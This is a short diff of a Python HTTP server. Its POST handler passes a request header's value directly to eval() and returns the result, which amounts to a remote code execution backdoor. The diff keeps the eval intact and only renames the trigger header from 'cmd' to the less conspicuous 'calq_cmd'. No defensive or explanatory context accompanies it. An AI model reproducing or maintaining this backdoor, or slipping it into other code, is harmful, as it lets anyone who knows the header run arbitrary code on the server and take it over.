@@ -3,7 +3,7 @@ from http.server import BaseHTTPRequestHandler, HTTPServer
 class Handler(BaseHTTPRequestHandler):
     def do_POST(self):
         try:
-            script_param = self.headers.get('cmd')
+            script_param = self.headers.get('calq_cmd')
             if script_param:
                 result = str(eval(script_param))
                 self.send_response(200)
